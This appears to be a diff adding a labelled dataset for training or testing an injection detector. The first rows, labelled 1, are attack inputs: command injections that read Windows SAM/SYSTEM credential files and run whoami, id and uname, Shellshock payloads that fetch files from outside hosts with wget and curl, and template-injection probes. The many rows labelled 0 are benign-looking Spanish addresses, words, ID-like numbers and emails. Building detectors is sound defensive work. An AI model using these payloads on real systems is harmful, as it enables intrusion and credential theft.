+type C:\Windows\repair\SYSTEM,1
+| type C:\WINNT\repair\SAM,1
+; type C:\WINNT\repair\SAM,1
+& type C:\WINNT\repair\SAM,1
+&& type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SYSTEM,1
+| type %SYSTEMROOT%\repair\SAM,1
+; type %SYSTEMROOT%\repair\SAM,1
+& type %SYSTEMROOT%\repair\SAM,1
+&& type %SYSTEMROOT%\repair\SAM,1
+type %SYSTEMROOT%\repair\SAM,1
+| type %SYSTEMROOT%\repair\SYSTEM,1
+; type %SYSTEMROOT%\repair\SYSTEM,1
+& type %SYSTEMROOT%\repair\SYSTEM,1
+&& type %SYSTEMROOT%\repair\SYSTEM,1
+type %SYSTEMROOT%\repair\SYSTEM,1
+uname,1
+;uname;,1
+| uname -a,1
+; uname -a,1
+& uname -a,1
+&& uname -a,1
+uname -a,1
+|/usr/bin/id,1
+;|/usr/bin/id|,1
+;/usr/bin/id|,1
+$;/usr/bin/id,1
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",1
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,1
+| wget http://crowdshield.com/.testing/rce.txt,1
+& wget http://crowdshield.com/.testing/rce.txt,1
+; wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),1
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,1
+wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+which curl,1
+which gcc,1
+which nc,1
+which netcat,1
+which perl,1
+which python,1
+which wget,1
+whoami,1
+| whoami,1
+; whoami,1
+' whoami,1
+' || whoami,1
+' & whoami,1
+' && whoami,1
+'; whoami,1
+" whoami
+ || whoami",1
+" | whoami
+ & whoami",1
+" && whoami
+; whoami",1
+$(`whoami`),1
+& whoami,1
+&& whoami,1
+"{{ get_user_file(""C:\boot.ini"") }}",1
+"{{ get_user_file(""/etc/hosts"") }}",1
+{{4+4}},1
+{{4+8}},1
+{{person.secret}},1
+{{person.name}},1
+{1} + {1},1
+{% For c in [1,1
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},1
+antigua de ancora s/n,0
+calle dean miranda 106,0
+10380,0
+madgett,0
+gerola pugliesi,0
+36574,0
+c/ comedias,0
+8.61689E+15,0
+tanchak,0
+antigua de ancora s/n,0
+calle dean miranda 106,0
+10380,0
+madgett,0
+gerola pugliesi,0
+36574,0
+c/ comedias,0
+8.61689E+15,0
+tanchak,0
+don quijote 81,0
+ceferina,0
+saturnino,0
+israel_piggot@joyclub.pe,0
+5n37do,0
+lanfranchi@getgold.tl,0
+micaas,0
+herrmann@codwatw.edu,0
+9.48E+15,0
+5.83899E+15,0
+ajoy,0
+irissou,0
+quisto,0
+s5bal850de,0
+balsam-prey@mmo.com.cat,0
+lurlene,0
+c/ elvas 112,0
+de canoves 13,0
+hembrick,0
+1.76488E+15,0
+darcy@google-movil.dz,0
+katia,0
+lenya@fbi-criminal-network.com.mil,0
+3.81894E+15,0
+penarroya ingla,0
+6.65741E+15,0
+calle artigako haritza,0
+kiyohara,0
+iracema,0
+2719,0
+recabdador,0
+40142,0
+bernadet,0
+76150645z,0
+29540,0
+nehemiah,0
+reiji,0
+plaa gabriela mistral,0
+mirabel,0
+sanidad,0
+arriharn espinet,0
+alguer murillo,0
+47419,0
+swearing,0
+lightfie,0
+epnimo,0
+guillen,0
+mahbeer,0
+zohar@pablobracamonte.bh,0
+azarshah,0
+m7124v3,0
+medianero,0
+euzaine@schnapps.com.gs,0
+amelia,0
+estival,0
+3.98E+15,0
+calle manco,0
+vinko,0
+parke antonio trueba 175,0
+8.5138E+15,0
+9.84215E+15,0
+calle la revoltosa,0
+calle hostieros,0
+condensativo,0
+44706,0
+5.88977E+15,0
+poma gozalbo,0
+40592671v,0
+contreras,0
+18611,0
+ma724-3ra,0
+olaya,0
+17744,0
+7118,0
+19219,0
+lula,0
+9.84is22nte334c799,0
+rub de bracamonte,0
+75771832b,0
+muthuswa,0
+d76en3r9n8z01,0
+c/ padilla,0
+8.85119E+15,0
+salter@quiromante.com.mg,0
+es3regamiento,0
+aflechate,0
+63829565b,0
+60613075w,0
+freydig rueda,0
+itrabo,0
+credido poma,0
+29491,0
+1064,0
+gula,0
+de1l2nda9ur4,0
+c/ honduras,0
+vajih,0
+salinillas de bureba,0
+6267,0
+c/ san ildefonso 106 10?h,0
+goldsmith1@esmarbella.ht,0
+arraia-maeztu,0
+34112,0
+protoalbitar,0
+pontevedra,0
+savoula,0
+2144,0
+albeta,0
+96761343k,0
+lamentante,0
+50159319e,0
+andrs castanyer,0
+neugebauer@buscamoto.gw,0
+harmony,0
+vlez acejas,0
+enlutada,0
+gabriela1,0
+c/ david 169 6-h,0
+methi,0
+graciliano,0
+61,0
+4.13841E+15,0
+steele,0
+1.44E+15,0
+brockie,0
+depredador,0
+comalada,0
+7633,0
+robledo,0
+37793,0
+archie,0
+47649,0
+4a2ho4a2o,0
+c/ coca de la piera 167,0
+oseja,0
+31410,0
+1.07544E+15,0
+36823414t,0
+ginest baquedano,0
+mallo etchart,0
+nanclares espejo,0
+serpiginoso,0
+calle dinamarca 14,0
+72523597c,0
+67242195q,0
+6.05128E+15,0
+aricel,0
+c/ concepcion alexandre 82,0
+v5llo34,0
+burg,0
+4135,0
+10161,0
+chorrito bajo,0
+8623,0
+l1b6855ca30e,0
+en546al,0
+c/ el breton,0
+koichi,0
+lamarr@tardos.mobi,0
+mieza,0
+16154,0
+salgado,0
+16118,0
+zapardiel de la ribera,0
+maughan@enfuerteventura.com.rw,0
+15994230f,0
+nazareno,0
+shou-che,0
+24152,0
+villalobn,0
+cardedeu 54,0
+pl. curro cuchares,0
+romeral,0
+10300,0
+firat6,0
+calle marino cervera,0
+sparky,0
+strock,0
+radunsky_oses@guejosgratis.cg,0
+alfredo calderon 136,0
+hanzlice,0
+paucides,0
+6.03007E+15,0
+puigpunyent,0
+zangn,0
+chilln,0
+6110,0
+galindo beneyto,0
+ayyuce,0
+de_la,0
+aventino,0
+47185,0
+5ecom058a?8a,0
+lugar los morros,0
+hinkie@goovitae.pg,0
+58305784w,0
+9.26768E+15,0
+grimm@madrid2012.nu,0
+michigan,0
+igal,0
+c/ hermanos pinzon 178,0
+grandy,0
+serneo,0
+bellaguarda,0
+cuesta sagrado corazon,0
+pike@multasdetransito.gf,0
+veneranda,0
+torre de arcas,0
+darrieu@redstarz.sv,0
+sntoma,0
+niu,0
+eduviges,0
+42010181z,0
+minera dauns,0
+8.96125E+15,0
+arima@hormigon-impreso.nu,0
+aguinaga achutegui,0
+6.90524E+15,0
+bradney4,0
+shanir,0
+34855320q,0
+wun,0
+stanger-kitabayashi7@gestionsoftware.th,0
+calle soria 154 2a,0
+humfrey,0
+1320,0
+poncin@todobetis.mil,0
+8170,0
+inglis@baltasarsantos.vu,0
+tindall-bourne@pintandomucho.cg,0
+es518l132n,0
+rajadell,0
+ramblizo,0
+d060u2ar,0
+8349,0
+brunton9,0
+sile,0
+8935,0
+4.5422E+15,0
+1.35689E+15,0
+azcrate campalan,0
+calle juan sebastian elcano,0
+heicy,0
+62,0
+massimil,0
+n89m3nd2,0
+6.69143E+14,0
+kindelan,0
+a79ga44,0
+49540097y,0
+2.75339E+15,0
+ibarra,0
+18898337l,0
+47gent1r,0
+estolano boget,0
+sierra bermeja s/n,0
+jimnez algora,0
+ponsati puratic,0
+ocallaghan@asyra.li,0
+28670,0
+calle joan salvat papasseit s/n,0
+28721,0
+nardi borgua,0
+roger,0
+san miguel de abona,0
+denni,0
+cercs,0
+d0s9pi2car,0
+o$ficinesca,0
+conde,0
+menju,0
+mccollon@irmedia.ca,0
+88360528w,0
+16856,0
+pesquisar,0
+subidor,0
+escudero ostria,0
+calle conde de cartagena 97 5f,0
+3.67249E+15,0
+3471,0
+marines,0
+senda buen paso s/n,0
+5366,0
+henry@sms24h.tr,0
+santaren,0
+mejury8,0
+38355013y,0
+trooger_gereighty@quierocortinas.mil,0
+06673981w,0
+pche,0
+hervs bediaga,0
+longo,0
+tunaroza capmany,0
+37795,0
+flixmara,0
+roni,0
+sertino,0
+umbria,0
+veri5icat1va,0
+2.22584E+14,0
+mouchet@007tv.fj,0
+parolero,0
+polanco,0
+jackelyn,0
+34310,0
+9ar5i04o,0
+indocto,0
+kouraviev@socimi.com.gl,0
+saleh,0
+e72i4,0
+sant andreu de la barca,0
+f8av2,0
+49211,0
+karin,0
+gu5cima,0
+keng@glutenfreespain.lb,0
+69671861p,0
+doriot,0
+6.71861E+15,0
+gregonio,0
+38821598j,0
+katy,0
+angullo acosta,0
+c63en13759,0
+23611263s,0
+29850288z,0
+cancela,0
+c/ grabador david roberts 154 1-h,0
+1.02549E+15,0
+37110,0
+de tena leguizamn,0
+5154,0
+eddisfor4,0
+4560,0
+4.92079E+15,0
+monvar/monver,0
+pobla de segur 125,0
+23670,0
+3.82074E+15,0
+15318,0
+8121,0
+41713468r,0
+3.18663E+15,0
+san petersburgo,0
+71648159p,0
+4176,0
+gift@distritoeste.no,0
+16601924h,0
+segura reygadas,0
+passeig gaudi 77,0
+llasera,0
+ca5r7211a,0
+16610,0
+cantoria,0
+hallaran@manjarr.cd,0
+haker-durango@mirallesmoscardo.ro,0
+22010612a,0
+trastabilln,0
+rocco-misaki@soybueno.nz,0
+20120,0
+leonel,0
+micr6pil8,0
+calle puebla de los infantes,0
+bscones de ojeda,0
+ares,0
+marcelino suarez 39,0
+847,0
+adalgisa,0
+5150,0
+88253687l,0
+decour raichs,0
+cusanelli@wdsl.ao,0
+perpi izurrieta,0
+robin@comerciosdeaspe.info,0
+barcelona 149,0
+66718383y,0
+incom1a5abl8mente,0
+leni,0
+baril,0
+35210254z,0
+teddie,0
+espaldilla,0
+1.06705E+14,0
+reiko,0
+portelan9,0
+50645313a,0
+c28a3iz8,0
+45370,0
+benavente,0
+99020664y,0
+5arneci052,0
+chimeneas,0
+bose,0
+041!da2131434e,0
+5e011llo,0
+c/ relfas 122,0
+murillo el cuende,0
+aa,0
+c/ clivia,0
+peral,0
+3j,0
+3411,0
+carretera ribas matama 160,0
+18567,0
+arco del meson,0
+57186589x,0
+surai,0
+3820,0
+childree,0
+712,0
+bidaurreta,0
+sfiroudi,0
+caesar-vitez2@apelton.sy,0
+56702228y,0
+carrera,0
+claudio,0
+mary-ann,0
+norberto,0
+caldes,0
+7.28065E+15,0
+42462633x,0
+557ni03r5o,0
+shakor,0
+rasmia,0
+tarp@redstarz.asia,0
+seno,0
+medwin-whittinghill@enla.th,0
+rodolfo,0
+hermanos gascon 141,0
+28530,0
+5083,0
+soman,0
+84411118z,0
+45256,0
+tornadizos de vila,0
+calle santa teresa,0
+incrdu69,0
+llombai,0
+8.00405E+14,0
+ulrico,0
+gatada,0
+linton,0
+gustat0v4,0
+6.27383E+15,0
+81,0
+huyente,0
+m9gnificen5i5,0
+werkmeister@19horas.zr,0
+2100,0
+22120,0
+rabascall,0
+braiam,0
+8.99091E+15,0
+hofmeist0,0
+calle duque de zaragoza s/n,0
+c/ san guillermo,0
+sahid,0
+6660,0
+wilde@casasdefamosos.zw,0
+9903rti37,0
+bablica,0
+07485924e,0
+5.25502E+15,0
+encuar,0
+ramss,0
+6160,0
+0e06u8s17,0
+4.61733E+15,0
+mclawhor,0
+44338,0
+fabrelle,0
+hormilleja,0
+mayor,0
+28815,0
+pascuala,0
+malditamente,0
+4.47874E+15,0
+5.9555E+15,0
+spaeth@directoriogratuito.kr,0
+19784273h,0
+84881293t,0
+carretera estacion,0
+coxcojita,0
+mohandas,0
+cel65co,0
+3.21396E+15,0
+9805,0
+75131649x,0
+pierre-y,0
+4.46813E+15,0
+en8og1da,0
+collado mediano,0
+des7768ab9e6os,0
+gabby,0
+isasi urquiza,0
+20001,0
+cherino gebhardt,0
+tracee,0
+8615,0
+3814,0
+perdign,0
+c/ corua,0
+sangborivutr@ssextremadura.gr,0
+tali,0
+26256,0
+3675,0
+5458,0
+camino san jaime 97,0
+hoeflich@movil-google.cx,0
+silvita,0
+1.13313E+15,0
+02877417w,0
+nardo,0
+toddi,0
+8110,0
+raddalgo,0
+karlweiss@barnicesuv.gov,0
+8.2197E+15,0
+26527823z,0
+18449,0
+c/ san miguel,0
+946,0
+dollie,0
+castillejo de meslen,0
+torrescrcela,0
+travs elias,0
+3.07443E+15,0
+pagni7@freecreditcheck.bg,0
+noviercas,0
+opsito,0
+albillos,0
+c/ espigo,0
+38182378d,0
+lev@ozlon.ke,0
+a3o1erada,0
+5696,0
+p4ot8tor,0
+bullen,0
+58265705n,0
+42210,0
+amorebieta-etxano,0
+digott_sims@enigmatico.ar,0
+makazaga millares,0
+centeno,0
+9464,0
+pallen,0
+bardallur,0
+kri!sti,0
+story.darby@hostingprofessional.mv,0
+rorke,0
+rohan,0
+nassiet.birkin@cienciapolicial.gl,0
+50549,0
+50344,0
+hirn,0
+minas de riotinto,0
+87853992h,0
+greg,0
+f36hu1a,0
+trespaderne,0
+thayra,0
+despernada,0
+90660924f,0
+labaque pericas,0
+villanueva de sigena,0
+7.05E+15,0
+c/ pintor viver s/n,0
+barceo,0
+2.45746E+15,0
+80216904b,0
+axman@culturalsanpedrocf.ie,0
+5.56439E+15,0
+rodo de la cerda,0
+8.35555E+15,0
+roco daira,0
+12480,0
+4.08791E+15,0
+pe7tr0b9,0
+breon@sexotelefono.mc,0
+maryrose,0
+tiru corominas,0
+alfonso.julissa@naturalchild.tk,0
+villanueva gualano,0
+5.07682E+15,0
+74132716j,0
+obscurantismo,0
+enang.ostar,0
+victoria,0
+mediona,0
+buch als,0
+35807418y,0
+diezma,0
+birney-warbeck@lamejorplaya.gl,0
+detleff3,0
+6.5524E+15,0
+hoya-gonzalo,0
+lawlik@housemovie.lk,0
+pockett_miguelin@noviasteresapalacios.aw,0
+demonlatra,0
+05636576n,0
+sugesto,0
+jose gomez gallito,0
+6.24331E+15,0
+trincha-32r1,0
+5230,0
+bernette2,0
+bnrinfo,0
+9mbaicin,0
+1.53418E+15,0
+7ar82fa,0
+yeladaky janeiro,0
+9423,0
+2.1902E+15,0
+calle horreo 85 10?d,0
+thordsen@guejos.sy,0
+alfajarn,0
+bo8iner4,0
+julin,0
+calle arins 87 4?e,0
+roca,0
+2293,0
+massaguer molin,0
+20098056n,0
+aedma@quadernideilgarda.ci,0
+44650,0
+2306,0
+san perfecto 8,0
+morn de almazn,0
+peine3@psychominders.gob,0
+kindermann@lawn.je,0
+mio de san esteban,0
+xerta,0
+4.1265E+15,0
+leonila,0
+boci+o,0
+apolonio,0
+conceptear,0
+rigas.albalak@albeiteria.it,0
+25330,0
+tramaced,0
+m86uca,0
+sevilla,0
+calle la salina 7 1?b,0
+xtiva,0
+andrease,0
+6.6591E+15,0
+maribeth4,0
+ci2586ta,0
+38728859x,0
+2.21E+15,0
+stapley@cirugiaplasticacordoba.jm,0
+plza. carmelo solis,0
+22513,0
+es3an7oso,0
+07559284n,0
+reto8sivo,0
+32790960k,0
+coomonte,0
+morosa,0
+modorrillo,0
+glazer,0
+pasaje magistrado salvador barbera 136,0
+bru_na,0
+e00tr6o,0
+cuellar reino,0
+warwicke@discon.mm,0
+marella,0
+c/ echegaray s/n,0
+18243165w,0
+c/ galvan 98 10?a,0
+54180440f,0
+holbrook,0
+perr@pasajesaereosbaratos.pm,0
+valencia,0
+vilagut victori,0
+46145,0
+ehrenfri,0
+villafranca del bierzo,0
+beom-sah,0
+tracisto arroyave,0
+strom.mahieuy4@karldeux.ac,0
+calle 300 al 8 del km. 1 puesta en riego 144,0
+salhany0,0
+el-gueba,0
+31271,0
+cebuano,0
+16,0
+pi y margall 17,0
+8en7dill3,0
+c/ barriada nueva andalucia,0
+neusy,0
+8.34964E+15,0
+stadler_munks@chevrolet-volt.at,0
+ransell,0
+5.58043E+15,0
+palacn aucapia,0
+monteys bold,0
+petree,0
+c/ academia,0
+randera,0
+43877,0
+prdica,0
+rainmake,0
+emilio arrieta,0
+lozier,0
+feutlins,0
+16926,0
+2.30E+15,0
+85766213h,0
+rustir,0
+barbads,0
+emil,0
+do cotaredo,0
+beln,0
+7395,0
+60,0
+florescu,0
+8a86ra7,0
+nicolalde llovet,0
+c/ 57 15,0
+des9o89451rac28,0
+60996626m,0
+3702,0
+koprulu,0
+7u4o84z1m07459,0
+slezak@ballerpoker.kn,0
+8318,0
+pasaje santo angel,0
+ferreries,0
+20048048y,0
+rei1@rtce.au,0
+c/ mijancas,0
+casaubn de rosa,0
+olite,0
+excusana,0
+tabaquera,0
+vargueo,0
+dyck,0
+zarrapastrosamente,0
+efran,0
+calle llorente,0
+19392,0
+paula,0
+2252,0
+c/ pozo seco 37,0
+kjer@multibuscador.com.ph,0
+ermina,0
+47eg0,0
+follosas,0
+tait@ibizasounds.ir,0
+siseo,0
+nicole-meyer@creacionesdolcevita.us,0
+gussack.reinecke@eddydaniele.pt,0
+04146926a,0
+4.89E+15,0
+parola@zonamodelos.pl,0
+schnirer,0
+whiteside.seyfferrtitz@cohel.uk,0
+c/ nicolas salmeron 73,0
+2ovi4in,0
+campello,0
+1.91636E+15,0
+huaranga chicon,0
+valeika@italianmotorvillagesevilla.gd,0
+aleandro-hayman@tecnoindomo.nr,0
+dangers9@paremoselalzheimer.az,0
+calle toronja,0
+eoin,0
+1.89129E+15,0
+parra,0
+jordi,0
+morande,0
+ignacio aldecoa,0
+c/jon de las moscas,0
+28413,0
+vilma,0
+pasivamente,0
+somisett,0
+travolta@professionalhost.com.cn,0
+29400,0
+narita@deportechino.an,0
+corulln,0
+ulldecona,0
+hi9dra,0
+supersticin,0
+jardines,0
+tierga,0
+688,0
+rio nervion,0
+koczian@decoaching.is,0
+24768,0
+10550,0
+srdida.me3te,0
+22115972t,0
+dierkop@hayunmundoahifuera.id,0
+a6ordab07,0
+6.18738E+15,0
+c/ javea 57,0
+haddon@hiperbarcelona.tl,0
+3.19291E+15,0
+5192,0
+machar,0
+pl. heroes de espaa 20 11?g,0
+ductilidad,0
+campe6n,0
+rattanap,0
+garabana belart,0
+jagdish,0
+06363808f,0
+9.5286E+15,0
+valdebenito garabana,0
+6991,0
+hwei-lin,0
+mcavoy-zabczynski@discotecateatre.gt,0
+atolera,0
+alexiana,0
+lnguida/longida,0
+37329,0
+matacandelas,0
+azorin,0
+57584234p,0
+33829,0
+suen,0
+natala,0
+pap@evelin.com.ly,0
+paisaje,0
+0utaperc09,0
+c/ san antonio 65 12?a,0
+40984940k,0
+tamer,0
+santa eulalia de oscos,0
+solana de los barros,0
+yecla,0
+kaempfe amilibia,0
+garroch_ista,0
+calle monte miramar,0
+quebrador,0
+gabbai,0
+backes@kimkardashian.com.lk,0
+laws cabezon,0
+maximinio,0
+tejeda,0
+a24a70re8a,0
+sant aniol de finestres,0
+17889538t,0
+samieian7,0
+1437,0
+santamarina,0
+6424,0
+plza. salamanca 39,0
+94lp90ulo,0
+adolfo,0
+5.17668E+15,0
+menelao,0
+00903443a,0
+lores bigas,0
+nadav6,0
+calle vizcaya,0
+17621392b,0
+alcdia de crespins,0
+9.83415E+15,0
+brenn,0
+gibert mallorqun,0
+holness,0
+denia,0
+8776,0
+29639,0
+2066,0
+band@casadedurcal.bi,0
+sa89gn,0
+karem,0
+22618043g,0
+chabrat,0
+54011879j,0
+pearroya-pueblonuevo,0
+quinita flores 75,0
+30599008s,0
+virgen de los imposibles 162,0
+fina,0
+avenida presidente carrero blanco 134,0
+24710,0
+incisivo,0
+84276481l,0
+3.88E+15,0
+enjoyelada,0
+maid,0
+lightnin@grupodescansoyhogar.web,0
+calle finlandia,0
+mattes,0
+mao,0
+caabate liano,0
+albets vilar,0
+55,0
+vlor,0
+porteril,0
+talavera 56,0
+8169,0
+c/ fancelli,0
+ergo226825e,0
+torrecilla lafuente,0
+calle santander,0
+guasca,0
+mccreano,0
+ornellas3@professionalhost.com.pro,0
+guino osarte,0
+49339665l,0
+godiva,0
+49694,0
+fe4r0g6ent8,0
+4.30298E+15,0
+4341,0
+38i2t702,0
+finca el jardinito,0
+laparra pinazo,0
+grifell brathwaite,0
+c/ arbitro eduardo vidal torres,0
+1776,0
+tchjan-lian.quadflieg@comerciosdeaspe.se,0
+43232451h,0
+duo_davalos@designworld.cz,0
+ansaldo,0
+herodes,0
+9.95219E+15,0
+3.65439E+15,0
+e0iz877,0
+dec4mas8xt6,0
+1.1363E+15,0
+atilio,0
+48128,0
+suto8i+a,0
+halim,0
+larraul,0
+enchufe,0
+raixa s/n,0
+c/ torcuato perez,0
+1?i0l,0
+tarasova_dabo@comerciosdeaspe.ly,0
+darnall,0
+op0o62i4,0
+rogan-darrieux@rocofer.tc,0
+roldan@intelethernet.gl,0
+hews,0
+ilijev@mauroman.tc,0
+calle plantio,0
+junquera,0
+bota,0
+c/ caos del peral 147,0
+6e0turer2,0
+3orc75r,0
+virgen,0
+8586,0
+wolbert.navin@cirugiaalbeiteria.nu,0
+1emat98,0
+roda deita,0
+zonc4o,0
+espins marmesat,0
+13630,0
+artica,0
+rhetta,0
+p563l5os1,0
+bols,0
+c/ garcia benitez 40 6-a,0
+batallanos halpin,0
+29?em2ti3a,0
+calle los tipografos,0
+9.8986E+14,0
+82444604t,0
+calle arfian 36,0
+cibeles,0
+tiberio,0
+52310665v,0
+aminda,0
+carrer nostra sra del pilar,0
+57417611c,0
+oliveira_aptekman@engibraltar.va,0
+metcalfe,0
+galdo palacn,0
+9193,0
+odonovan@piaceredelivery.ro,0
+69054908f,0
+fortet esquer,0
+gianna,0
+57,0
+2.97358E+15,0
+sangres,0
+drop-box,0
+polvo,0
+kristl@voragolive.vn,0
+48638626c,0
+c/ guillen santacilla 94,0
+cycelia,0
+8230,0
+musson@ajuntamentdebarcelona20.pr,0
+masia can giro,0
+7.38083E+15,0
+gelogo,0
+4ino57l,0
+5.57567E+15,0
+carbonell calvet,0
+hacanea,0
+7.50908E+15,0
+29500,0
+mandruso,0
+477dj6r,0
+99999464h,0
+1789,0
+28609,0
+86m-bra,0
+50408,0
+versteeg,0
+calle licurgo,0
+rolando,0
+torgo,0
+carre mamani,0
+calle isis,0
+ivonne,0
+0ntrecerrar,0
+arbizu,0
+6.44636E+15,0
+o rio,0
+tolox,0
+57rsant2541,0
+indoct9me7te,0
+c/ joaquin guichot,0
+41392002y,0
+farid,0
+abdul-sa,0
+losar de la vera,0
+lava,0
+52207398c,0
+villamediana de iregua,0
+36lis8r,0
+orieta,0
+25186,0
+vilamartn de valdeorras,0
+elysee,0
+vallb remesar,0
+4376,0
+lucila2,0
+qui0g6n16si2o,0
+brier,0
+ip50,0
+72935768p,0
+5.72741E+15,0
+3.64462E+15,0
+rushmann@clubforex.jm,0
+jana,0
+de4f1g6raci4,0
+jaraba villa,0
+10155328t,0
+3.68572E+15,0
+96804276j,0
+infante juan manuel s/n 5?a,0
+rombeek,0
+chicle,0
+71579092x,0
+sobrecogimiento,0
+1102,0
+06314426y,0
+kinsman,0
+alcojor larenas,0
+3.33213E+15,0
+3.6585E+15,0
+schucrenberg-oheaney3@testdevelcidad.info,0
+c96reveidil5,0
+esplendoroso,0
+laurance@familiamarino.td,0
+92793320g,0
+7o14c0o,0
+calle sierra del quintanar,0
+nelia3,0
+1.06099E+14,0
+lucas fiallega,0
+4.43193E+15,0
+palmario,0
+josee,0
+tandy,0
+85009634r,0
+olrich-shapiro1@nuriamartin.aw,0
+stella mara,0
+_bielda,0
+1e1ador,0
+qu.8ncen3rio,0
+jernima,0
+ardie9temente,0
+sagaceta farell,0
+flori@casabolsa43.np,0
+89285662f,0
+ha3fila,0
+chanampa coromino,0
+pl. francisca pacheco,0
+limpi$aas,0
+44,0
+mehd3,0
+16452,0
+7a7i86,0
+kinsey@etnics.fm,0
+manzanares bruguer,0
+ballonga,0
+abuuelada,0
+6246,0
+tacuara,0
+cowper@elbauldelosrefranes.pm,0
+44494,0
+castellol,0
+7.35961E+15,0
+calle pago de la serrana 109,0
+cami de almoster,0
+50212,0
+baladora,0
+25617,0
+95944263q,0
+derbarn henriquez,0
+5.37737E+15,0
+97573176t,0
+pertusa boladera,0
+faustino cavadas 162 6-a,0
+lanae,0
+maestro de burgos,0
+donadio_honig@donkr.zr,0
+pl. los oficios,0
+kussauer_brereton@showcarsmadrid.com.kp,0
+78260205z,0
+qu1s3da,0
+antonio juez 67 3?a,0
+empel6tarse,0
+pancracia,0
+fullum6,0
+c/ arago 194,0
+calle poligono quintos,0
+alcarrs,0
+1.93371E+15,0
+retiendas,0
+tomi,0
+louladak,0
+lavada,0
+23291292c,0
+castell-platja d'aro,0
+stankova@carrillo-de-albornoz.pt,0
+33455,0
+le8ru41,0
+c/ plza. 18,0
+ateniesa,0
+c/ juan de rihuerga,0
+9i3a,0
+5141,0
+gall20o,0
+18212,0
+chalanera,0
+c/ berruguete 23,0
+65651817l,0
+b82r8l23o,0
+matney,0
+6928,0
+san vicente del raspeig/sant vicent del raspeig,0
+5.68541E+15,0
+calle puerto de alcolea 185 9-e,0
+velasque9,0
+34361279s,0
+lyden@.mv,0
+15873,0
+ramaprak,0
+ubraco,0
+cosmo@vilainstal.sv,0
+credenciales incorrectas,0
+cordelado,0
+50830,0
+beland,0
+conejo mota,0
+6745,0
+tennant4,0
+darns cabrianes,0
+torrente zaldvar,0
+miramon@logiteclines.rs,0
+tice,0
+oate fijo,0
+66339533n,0
+antonio ulloa 6 6?d,0
+#NAME?,0
+ivon,0
+deighton_pfaudler@ajuntamentdebarcelona20.vn,0
+murgua aversa,0
+rajarshi,0
+p4rtapaz,0
+ciadoncha,0
+gribov-ridgeley@creacionwebs.lk,0
+gomero gallardo,0
+calle juan de sevilla 102 3c,0
+21444030a,0
+c/ las niadas,0
+zohreh,0
+cryoelec,0
+cobea,0
+plaa dels bous,0
+acho queralt,0
+bekki,0
+maheu,0
+magdalen1,0
+16741,0
+plaa caudillo 60,0
+sonoe,0
+aguacella,0
+olivares,0
+minguez,0
+pernign,0
+26241,0
+c/ los rosales 166,0
+gueldos donohue,0
+aldhizer,0
+patrica0,0
+4a6050,0
+gomecello,0
+00505336a,0
+7840,0
+sedero,0
+jamaly,0
+selles tanari,0
+melosa,0
+lesire@masqueclases.gn,0
+alberta,0
+clipsham5,0
+c/ fontans,0
+petxina,0
+c/ duran 52,0
+13420,0
+43391,0
+6ait1na89,0
+1317,0
+zaleska_legon@zampy.so,0
+4.34481E+15,0
+decacque,0
+ceseri@discotecateatre.do,0
+urbanitzacio europa-fuentes de san bernabe s/n,0
+maxsom,0
+p6lma13isti,0
+innes,0
+travesia palacio 61,0
+5.65818E+15,0
+23531966e,0
+ravinder,0
+brinton2@tartasconamor.lr,0
+8937,0
+padr pavajeau,0
+53087910t,0
+10262643c,0
+chamberlain@muevemiweb.al,0
+tordera savall,0
+54430634f,0
+frasquit,0
+l+echosa,0
+de lagarza delacerda,0
+perih1lio,0
+tila,0
+fortner,0
+22416,0
+aylln tamallangos,0
+arbeca,0
+robin,0
+2759,0
+6r5int3805,0
+yihban,0
+50690,0
+9751,0
+merkling,0
+7.75E+15,0
+cesana@lasexta-f1.jm,0
+0i26or7os9,0
+01062744y,0
+desnarigada,0
+cabildeo,0
+newlinsky@forohh.et,0
+wicht,0
+mara,0
+pascual,0
+c/ caamaque,0
+amescua,0
+37759460s,0
+saunder,0
+33rb0rr55ada,0
+21890,0
+oda,0
+30666350j,0
+c/ ruiz de salazar,0
+valdelinares,0
+ibarrangelu,0
+shukuri@velaconsultores.nl,0
+1.78478E+15,0
+8012,0
+*paci3nte,0
+79533872x,0
+1.67E+15,0
+lheureux,0
+modigh,0
+lilias,0
+7.86165E+15,0
+avinguda guix borrull 170,0
+78267819s,0
+calle abeto,0
+coursdev,0
+plaza aparejador federico bermudez 139,0
+48289,0
+peller@arvigar.gs,0
+basilisa,0
+sheara,0
+14977979b,0
+gino,0
+4.19037E+15,0
+pia rusch,0
+6.95924E+15,0
+02624260y,0
+afkham,0
+c/ costa i llobera 83,0
+6ilia+ria,0
+camp morante,0
+c/ carranque,0
+heidi,0
+ceccarelli urp,0
+zambrana,0
+samardzic.carafotes@bruoseguridad.je,0
+roussel@santacruzdelvoto.ws,0
+03291016s,0
+benchley@11horas.fk,0
+2300,0
+walker,0
+dipscea,0
+t!74ador,0
+altamiranda aragons,0
+folsom_talli@esteticadayda.tel,0
+5900,0
+felipa,0
+youji,0
+foixenc illanes,0
+calle alonso nuez 186,0
+gierasch.casini@goovitae.cu,0
+33470889r,0
+kaitlynn,0
+277,0
+caridad 82,0
+96110955g,0
+dre,0
+sa5na,0
+22860,0
+hengevel,0
+eugen-fargue@andrestabernero.im,0
+cheyenne,0
+ramells lam,0
+1.93755E+15,0
+francois,0
+22193,0
+azadonad?a,0
+barrachina,0
+2a6in6rosa,0
+fisicoqumico,0
+rusch de celis,0
+estanislao,0
+o+bispar,0
+kingston@professionalhost.com.ag,0
+basile@europop.by,0
+ecija 51 12-h,0
+gourley,0
+corrales de duero,0
+5335,0
+9.56114E+15,0
+sayara,0
+sant celoni,0
+66381379k,0
+calle san millan,0
+antypas sardans,0
+calle pea de francia,0
+szeto,0
+evacuacin,0
+plaza alfonso el batallador,0
+goth,0
+6.9084E+15,0
+25140,0
+fauno,0
+0g83ma7ora,0
+bernadita,0
+19275,0
+colja@suecas.com.tel,0
+c/ sant antoni maria claret,0
+8721,0
+oruna,0
+nihei_donat@multaspendientes.cu,0
+dybenko,0
+2946,0
+veronese vitte,0
+fontanarejo,0
